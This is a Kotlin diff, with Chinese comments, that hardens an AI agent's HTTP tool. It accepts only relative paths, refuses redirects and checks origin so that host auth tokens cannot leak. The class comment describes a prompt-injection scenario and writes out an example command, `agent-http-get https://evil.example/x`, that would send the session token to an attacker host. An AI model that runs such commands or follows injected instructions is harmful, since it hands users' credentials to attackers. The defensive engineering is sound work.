@@ -8,10 +8,15 @@ import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.json.buildJsonArray
 import kotlinx.serialization.json.buildJsonObject
 import kotlinx.serialization.json.put
+import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
+import java.io.ByteArrayOutputStream
+import java.nio.charset.CharacterCodingException
+import java.nio.charset.CodingErrorAction
 import java.util.concurrent.TimeUnit
 
 /**
@@ -30,24 +35,47 @@ import java.util.concurrent.TimeUnit
  * - 响应体**有上限**，超了截断并明确标记；
  * - 状态码、超时、连接失败都转成**说清原因**的错误。
  *
+ * ## 安全边界（2026-11-01 修：**只允许相对路径**）
+ *
+ * 本能力**只接受宿主基地址下的相对路径**；完整 URL（`http(s)://…`、`//host/…`、`file:` 等任何带 scheme 的写法）
+ * 一律 [CapabilityFailure] 拒绝。
+ *
+ * 为什么必须这么严：
+ * - 宿主的鉴权头（`Authorization: Bearer <会话 token>`）是宿主**每个请求现取**、由本类注入的；
+ * - 只要允许一个完整 URL，一段提示词注入就能让模型写 `agent-http-get https://evil.example/x`
+ *   ⇒ **把会话 token 原样送到攻击者的主机**。`--header` 黑名单挡不住这条路 —— 它只管「模型自填的头」，
+ *   而 token 是宿主自己加的；
+ * - 所以这里不做「跨源少发一个头」，而是**跨源直接不存在**（拒绝整条命令）。
+ *   「少发头」会让请求带着 401 回来，模型只会以为接口坏了，看不出这是安全拦截。
+ *
+ * 同理：**不跟随 HTTP 跳转**（3xx 直接报错）。跳转是把「已经带上鉴权头的请求」导去别的主机的经典手法，
+ * 而且 OkHttp 跨主机跳转只剥 `Authorization`，宿主自定义的鉴权头（`X-Api-Key` 之类）照样带过去。
+ *
+ * 要跨主机取数，请宿主另配一条能力 / 另一个基地址 —— 本类**不做多基地址**。
+ *
  * ## 命令
  *
  * ```
- * agent-http-get  <url|相对路径> [--header "K: V"] [--timeout 15000] [--max-bytes 200000]
- * agent-http-post <url|相对路径> [--header "K: V"] [--data "{...}"] [--timeout 15000]
+ * agent-http-get  <相对路径> [--header "K: V"] [--timeout 15000] [--max-bytes 200000]
+ * agent-http-post <相对路径> [--header "K: V"] [--data "{...}"] [--timeout 15000]
  * ```
+ *
+ * `--max-bytes` 是**响应体字节上限**（默认 200000，硬上限 2 MB）：响应体按块流式读，
+ * 到上限就停并标 `truncated:true`，**不会**先把整个响应读进内存。
  */
 class AgentHttpCapabilities(
     /**
      * 宿主 API 的基地址（如 `https://host.example/api`）。
-     * 留空则只能传完整 URL。
+     *
+     * **唯一允许访问的目标**：能力只接受相对路径，拼到这个基地址上。
+     * 留空 = 没法拼 → 所有调用都明确失败（不再有「留空就传完整 URL」那条路，那正是 token 外泄口）。
      */
     private val baseUrlProvider: () -> String = { "" },
-    /** 宿主注入的默认请求头（**含鉴权**）。agent 看不到它们，也不需要知道。 */
+    /** 宿主注入的默认请求头（**含鉴权**）。**只发给同源地址**；agent 看不到它们，也不需要知道。 */
     private val defaultHeadersProvider: () -> Map<String, String> = { emptyMap() },
     /** 默认超时（毫秒）。 */
     private val timeoutMs: Long = 15_000L,
-    /** 响应体最大字节数；超了截断并标记 `truncated:true`。 */
+    /** 响应体最大字节数；超了截断并标记 `truncated:true`。会被夹到 [HARD_MAX_BYTES] 以内。 */
     private val maxBytes: Int = 200_000,
 ) {
     /** 固定地址 / 固定头的便捷写法。 */
@@ -62,11 +90,22 @@ class AgentHttpCapabilities(
         .callTimeout(timeoutMs, TimeUnit.MILLISECONDS)
         .connectTimeout(timeoutMs, TimeUnit.MILLISECONDS)
         .readTimeout(timeoutMs, TimeUnit.MILLISECONDS)
+        // **不跟随跳转**：3xx 会把「已经带上宿主鉴权头的请求」导去别的主机。
+        // OkHttp 跨主机只剥 Authorization，宿主自定义的鉴权头（X-Api-Key 之类）照样带过去
+        // ⇒ 干脆一跳都不跟，3xx 由 perform() 翻译成明确错误。
+        .followRedirects(false)
+        .followSslRedirects(false)
         .build()
 
     val capabilities: List<DeviceCapability> = listOf(
-        HttpGetCapability(client, baseUrlProvider, defaultHeadersProvider, timeoutMs, maxBytes),
-        HttpPostCapability(client, baseUrlProvider, defaultHeadersProvider, timeoutMs, maxBytes),
+        HttpGetCapability(
+            client, baseUrlProvider, defaultHeadersProvider, timeoutMs,
+            maxBytes.coerceIn(1, HARD_MAX_BYTES),
+        ),
+        HttpPostCapability(
+            client, baseUrlProvider, defaultHeadersProvider, timeoutMs,
+            maxBytes.coerceIn(1, HARD_MAX_BYTES),
+        ),
     )
 }
 
@@ -112,13 +151,29 @@ private fun parseHttpArgs(
                 i += 2
             }
             "--timeout" -> {
-                timeout = args.getOrNull(i + 1)?.toLongOrNull()
-                    ?: throw CapabilityFailure("用法：$usage")
+                val raw = args.getOrNull(i + 1)
+                val value = raw?.toLongOrNull()
+                    ?: throw CapabilityFailure("--timeout 要一个整数毫秒数（例如 --timeout 15000）。用法：$usage")
+                if (value !in 1..MAX_TIMEOUT_MS) {
+                    throw CapabilityFailure("--timeout 要在 1..$MAX_TIMEOUT_MS 毫秒之间（收到 $value）。")
+                }
+                timeout = value
                 i += 2
             }
             "--max-bytes" -> {
-                maxBytes = args.getOrNull(i + 1)?.toIntOrNull()
-                    ?: throw CapabilityFailure("用法：$usage")
+                val raw = args.getOrNull(i + 1)
+                val value = raw?.toIntOrNull()
+                    ?: throw CapabilityFailure("--max-bytes 要一个整数（例如 --max-bytes 200000）。用法：$usage")
+                if (value <= 0) {
+                    throw CapabilityFailure("--max-bytes 必须大于 0（收到 $value）。")
+                }
+                if (value > HARD_MAX_BYTES) {
+                    throw CapabilityFailure(
+                        "--max-bytes 最多 $HARD_MAX_BYTES 字节（2 MB，收到 $value）：" +
+                            "再大就只是在考验内存，不是在取数据。要更多请让宿主分批取。",
+                    )
+                }
+                maxBytes = value
                 i += 2
             }
             else -> {
@@ -187,19 +242,57 @@ private fun checkHeaderValue(name: String, value: String) {
     }
 }
 
-/** 把相对路径拼到基地址上；完整 URL 原样用。 */
-private fun resolveUrl(base: String, target: String): String {
-    if (target.startsWith("http://") || target.startsWith("https://")) return target
-    if (base.isBlank()) {
-        throw CapabilityFailure("「$target」不是完整 URL，而本环境没有配基地址 —— 请给完整的 http(s) 地址")
+/**
+ * 把**相对路径**拼到基地址上。完整 URL 一律拒绝（见类注释「安全边界」）。
+ *
+ * 判定「像绝对地址」的三类写法（都不允许）：
+ * - 带 scheme：`http:` / `https:` / `file:` / `javascript:` …（正则只看开头，`/a:b` 这种路径里的冒号不受影响）；
+ * - 协议相对：`//evil.example/x`（浏览器语义里这就是跨主机）；
+ * - Windows UNC：`\\evil\share`（模型偶尔会这么写）。
+ */
+private fun resolveTarget(base: String, target: String): String {
+    val raw = target.trim()
+    if (raw.isEmpty()) throw CapabilityFailure("要调哪个路径？例如 /api/weather。")
+    if (looksAbsolute(raw)) {
+        throw CapabilityFailure(
+            "只能调本站的相对路径（例如 /api/weather），不能传完整 URL「$raw」。" +
+                "宿主的鉴权头只发给本站 —— 允许完整 URL 就等于允许把会话 token 送到任意主机；" +
+                "要跨主机取数，请宿主另配一条能力（本能力只服务一个基地址）。",
+        )
     }
-    val trimmedBase = base.trimEnd('/')
-    return if (target.startsWith("/")) "$trimmedBase$target" else "$trimmedBase/$target"
+    if (base.isBlank()) {
+        throw CapabilityFailure(
+            "「$raw」是相对路径，但本环境没有配基地址（baseUrl）—— " +
+                "本能力只允许调宿主配的基地址下的相对路径，不再接受完整 URL。",
+        )
+    }
+    val trimmedBase = base.trim().trimEnd('/')
+    return if (raw.startsWith("/")) "$trimmedBase$raw" else "$trimmedBase/$raw"
+}
+
+/** 像不像绝对地址（见 [resolveTarget] 的三类写法）。 */
+private fun looksAbsolute(raw: String): Boolean =
+    raw.startsWith("//") || raw.startsWith("\\\\") || ABSOLUTE_URL_PATTERN.matches(raw)
+
+/** `http:` / `https:` / `file:` …… 任何 scheme 开头都算绝对地址。 */
+private val ABSOLUTE_URL_PATTERN = Regex("^[A-Za-z][A-Za-z0-9+.\\-]*:.*")
+
+/**
+ * 两个 URL 是不是**同源**（scheme + host + port 全等；端口用 OkHttp 归一化后的默认值比较）。
+ *
+ * 用 `HttpUrl` 归一化而不是自己切字符串：`HTTPS://Host.Example:443` 与 `https://host.example`
+ * 必须算同一个源，否则会出现「看起来在调自己的接口，实际一个鉴权头都不带」的假故障。
+ */
+internal fun isSameOrigin(a: String, b: String): Boolean {
+    val ua = a.toHttpUrlOrNull() ?: return false
+    val ub = b.toHttpUrlOrNull() ?: return false
+    return ua.scheme == ub.scheme && ua.host == ub.host && ua.port == ub.port
 }
 
 private fun perform(
     client: OkHttpClient,
     method: String,
+    baseUrl: String,
     url: String,
     headers: List<Pair<String, String>>,
     defaultHeaders: Map<String, String>,
@@ -207,6 +300,15 @@ private fun perform(
     timeoutMs: Long,
     maxBytes: Int,
 ): String {
+    // **同源才注入宿主鉴权头**；不同源不是「少发一个头」，而是整条请求拒绝。
+    // 少发头的话，请求会带着 401 回来，模型只会以为接口坏了 —— 看不出这是安全拦截。
+    if (!isSameOrigin(baseUrl, url)) {
+        throw CapabilityFailure(
+            "拒绝执行：目标地址（$url）与宿主基地址（$baseUrl）不是同一个源。" +
+                "宿主的鉴权头只发给同源地址；要跨主机取数，请宿主另配一条能力。",
+        )
+    }
+
     val builder = Request.Builder().url(url)
     // 宿主注入的默认 header 先放，随后 agent 指定的同名 header 覆盖它。
     defaultHeaders.forEach { (k, v) ->
@@ -237,15 +339,23 @@ private fun perform(
     }
 
     response.use { resp ->
-        val text = resp.body?.string().orEmpty()
+        val read = readBodyCapped(resp, maxBytes)
         val elapsed = System.currentTimeMillis() - started
-        val truncated = text.length > maxBytes
-        val payload = if (truncated) text.take(maxBytes) else text
+
+        // 3xx：**不跟随**（客户端已关掉 followRedirects）。跳转目标由对面控制，
+        // 跟过去就等于把已经带上宿主鉴权头的请求交给另一台主机。
+        if (resp.code in 300..399) {
+            throw CapabilityFailure(
+                "对方要求跳转（HTTP ${resp.code} → ${resp.header("Location") ?: "（没给 Location）"}）。" +
+                    "本能力**不跟随跳转**：跳转会把已带宿主鉴权头的请求带去别的主机。" +
+                    "请直接调最终地址（由宿主把基地址改成最终地址）。",
+            )
+        }
 
         if (!resp.isSuccessful) {
             // 非 2xx：请求本身成功了，但**这次取数据失败了** —— 明确报错，带上状态码和响应片段。
             throw CapabilityFailure(
-                "HTTP ${resp.code} ${resp.message}（$method $url）：${payload.take(500)}"
+                "HTTP ${resp.code} ${resp.message}（$method $url）：${read.text.take(500)}"
             )
         }
 
@@ -264,13 +374,74 @@ private fun perform(
         return okJson {
             put("status", resp.code)
             put("content_type", resp.body?.contentType()?.toString() ?: "")
-            put("bytes", text.length)
-            put("truncated", truncated)
+            // bytes 现在是**真的字节数**（旧实现是 String.length，中文会算少）。
+            put("bytes", read.bytes)
+            put("truncated", read.truncated)
             put("elapsed_ms", elapsed)
-            put("body", payload)
+            put("body", read.text)
             put("headers", headersJson)
         }
     }
+}
+
+/** 响应体读取结果：解码后的文本 + 实际读到的**字节数** + 是否因为到上限而被截断。 */
+private class BodyRead(val text: String, val bytes: Int, val truncated: Boolean)
+
+/**
+ * **流式**读响应体，最多 [maxBytes] 字节。
+ *
+ * 旧写法 `resp.body.string()` 会先把整个响应读进内存，再 `take(maxBytes)` ——
+ * 对面给 500 MB，手机就先吃掉 500 MB，然后才说「截断」。现在按 8 KiB 块读，
+ * 到上限立刻停（关流即取消剩余下载）。
+ *
+ * 截断处按 **UTF-8 边界**回收：否则最后一个汉字的字节被切一半，解码出 `�`，
+ * 模型会以为接口返回了坏数据。
+ */
+private fun readBodyCapped(resp: Response, maxBytes: Int): BodyRead {
+    val body = resp.body ?: return BodyRead("", 0, false)
+    val out = ByteArrayOutputStream(minOf(maxBytes, READ_CHUNK * 2))
+    val buf = ByteArray(READ_CHUNK)
+    var truncated = false
+    body.byteStream().use { input ->
+        while (true) {
+            val n = input.read(buf)
+            if (n < 0) break
+            val room = maxBytes - out.size()
+            if (n > room) {
+                if (room > 0) out.write(buf, 0, room)
+                truncated = true
+                break
+            }
+            out.write(buf, 0, n)
+        }
+    }
+    var bytes = out.toByteArray()
+    if (truncated) bytes = trimToUtf8Boundary(bytes)
+    return BodyRead(String(bytes, Charsets.UTF_8), bytes.size, truncated)
+}
+
+/**
+ * 把截断处回退到 UTF-8 字符边界（最多退 3 个字节）。
+ *
+ * 退不掉就说明正文本身不是合法 UTF-8（二进制/别的编码）—— 这时**不要**把整段吞掉，
+ * 退回宽松解码（最多带一个替换符），比返回空正文诚实。
+ */
+private fun trimToUtf8Boundary(bytes: ByteArray): ByteArray {
+    val decoder = Charsets.UTF_8.newDecoder()
+        .onMalformedInput(CodingErrorAction.REPORT)
+        .onUnmappableCharacter(CodingErrorAction.REPORT)
+    var end = bytes.size
+    repeat(4) {
+        if (end <= 0) return ByteArray(0)
+        decoder.reset()
+        try {
+            decoder.decode(java.nio.ByteBuffer.wrap(bytes, 0, end))
+            return if (end == bytes.size) bytes else bytes.copyOf(end)
+        } catch (e: CharacterCodingException) {
+            end--
+        }
+    }
+    return bytes.copyOf(end)
 }
 
 /**
@@ -305,14 +476,15 @@ private class HttpGetCapability(
 ) : DeviceCapability {
     override val name: String = "http-get"
     override val origin: CapabilityOrigin = CapabilityOrigin.INTERNAL
-    override val usage: String = "agent-http-get <url|相对路径> [--header \"K: V\"] [--timeout 15000]"
+    override val usage: String = "agent-http-get <相对路径> [--header \"K: V\"] [--timeout 15000] [--max-bytes 200000]"
 
     override fun run(args: List<String>): String {
         val parsed = parseHttpArgs(args, usage, defaultTimeoutMs, defaultMaxBytes, allowBody = false)
-        val url = resolveUrl(baseUrlProvider(), parsed.url)
+        val baseUrl = baseUrlProvider()
+        val url = resolveTarget(baseUrl, parsed.url)
         return runBlocking {
             perform(
-                client, "GET", url, parsed.headers, defaultHeadersProvider(), null,
+                client, "GET", baseUrl, url, parsed.headers, defaultHeadersProvider(), null,
                 parsed.timeoutMs, parsed.maxBytes,
             )
         }
@@ -329,14 +501,15 @@ private class HttpPostCapability(
 ) : DeviceCapability {
     override val name: String = "http-post"
     override val origin: CapabilityOrigin = CapabilityOrigin.INTERNAL
-    override val usage: String = "agent-http-post <url|相对路径> [--header \"K: V\"] [--data \"{...}\"]"
+    override val usage: String = "agent-http-post <相对路径> [--header \"K: V\"] [--data \"{...}\"]"
 
     override fun run(args: List<String>): String {
         val parsed = parseHttpArgs(args, usage, defaultTimeoutMs, defaultMaxBytes, allowBody = true)
-        val url = resolveUrl(baseUrlProvider(), parsed.url)
+        val baseUrl = baseUrlProvider()
+        val url = resolveTarget(baseUrl, parsed.url)
         return runBlocking {
             perform(
-                client, "POST", url, parsed.headers, defaultHeadersProvider(), parsed.body,
+                client, "POST", baseUrl, url, parsed.headers, defaultHeadersProvider(), parsed.body,
                 parsed.timeoutMs, parsed.maxBytes,
             )
         }
@@ -354,3 +527,12 @@ internal val FORBIDDEN_REQUEST_HEADERS: Set<String> = setOf(
     "cookie",
     "set-cookie",
 )
+
+/** 响应体硬上限：2 MB。超过就中断读取（不读进内存）并标 `truncated:true`。 */
+private const val HARD_MAX_BYTES = 2 * 1024 * 1024
+
+/** `--timeout` 上限（毫秒）：一次工具调用不该挂几分钟。 */
+private const val MAX_TIMEOUT_MS = 120_000L
+
+/** 流式读取的块大小。 */
+private const val READ_CHUNK = 8 * 1024
